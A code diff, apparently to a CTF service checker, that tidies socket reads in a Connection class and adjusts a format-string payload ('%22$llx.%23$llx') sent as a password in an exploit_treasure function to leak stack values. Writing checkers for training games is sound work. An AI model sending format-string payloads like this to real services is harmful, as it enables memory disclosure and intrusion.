@@ -68,19 +68,19 @@ class Connection:
         # Create the file
         self.writer.write(f"bury {filename}\n".encode())
         await self.writer.drain()
-        data = await self.reader.readuntil(b": ")
+        await self.reader.readuntil(b": ")
         # Write timestamp
         self.writer.write(f"{timestamp}\n".encode())
         await self.writer.drain()
-        data = await self.reader.readuntil(b": ")
+        await self.reader.readuntil(b": ")
         # Write blank password
         self.writer.write(f"\n".encode())
         await self.writer.drain()
-        data = await self.reader.readuntil(b": ")
+        await self.reader.readuntil(b": ")
         # Write blank to reject storing as .private
         self.writer.write(f"\n".encode())
         await self.writer.drain()
-        data = await self.reader.readuntil(b": ")
+        await self.reader.readuntil(b": ")
         # Write message
         self.writer.write(f"{message}\n".encode())
         await self.writer.drain()
@@ -96,19 +96,19 @@ class Connection:
         # Go to the directory
         self.writer.write(f"sail {directory}\n".encode())
         await self.writer.drain()
-        data = await self.reader.readuntil(b"$ ")
+        await self.reader.readuntil(b"$ ")
         # Create the file
         self.writer.write(f"bury {filename} {flag}\n".encode())
         await self.writer.drain()
-        data = await self.reader.readuntil(b": ")
+        await self.reader.readuntil(b": ")
         # Write timestamp
         self.writer.write(f"{timestamp}\n".encode())
         await self.writer.drain()
-        data = await self.reader.readuntil(b": ")
+        await self.reader.readuntil(b": ")
         # Write password
         self.writer.write(f"{password}\n".encode())
         await self.writer.drain()
-        data = await self.reader.readuntil(b": ")
+        await self.reader.readuntil(b": ")
         # Write message
         self.writer.write(f"{message}\n".encode())
         await self.writer.drain()
@@ -125,22 +125,23 @@ class Connection:
         # Go to the directory
         self.writer.write(f"sail {directory}\n".encode())
         await self.writer.drain()
-        data = await self.reader.readuntil(b"$ ")
+        await self.reader.readuntil(b"$ ")
         # Create the file
         self.writer.write(f"bury {filename} {flag}\n".encode())
         await self.writer.drain()
-        data = await self.reader.readuntil(b": ")
+        await self.reader.readuntil(b": ")
         # Write timestamp
         self.writer.write(f"{timestamp}\n".encode())
         await self.writer.drain()
-        data = await self.reader.readuntil(b": ")
+        await self.reader.readuntil(b": ")
         # Write blank password
         self.writer.write(f"\n".encode())
         await self.writer.drain()
+        await self.reader.readuntil(b": ")
         # Write "y" to store as .private
         self.writer.write(f"y\n".encode())
         await self.writer.drain()
-        data = await self.reader.readuntil(b": ")
+        await self.reader.readuntil(b": ")
         # Write message
         self.writer.write(f"{message}\n".encode())
         await self.writer.drain()
@@ -337,7 +338,7 @@ async def exploit_treasure(task: ExploitCheckerTaskMessage, searcher: FlagSearch
     await conn.reader.readuntil(b": ")
 
     # Send the format string exploit as the password
-    conn.writer.write(b'%28$llx.%29$llx\n') # TODO: %31$llx.%32$llx locally, find out why?
+    conn.writer.write(b'%22$llx.%23$llx\n') # TODO: %31$llx.%32$llx locally, find out why?
     await conn.writer.drain()
 
     # Read the buffer to get the incorrect password message
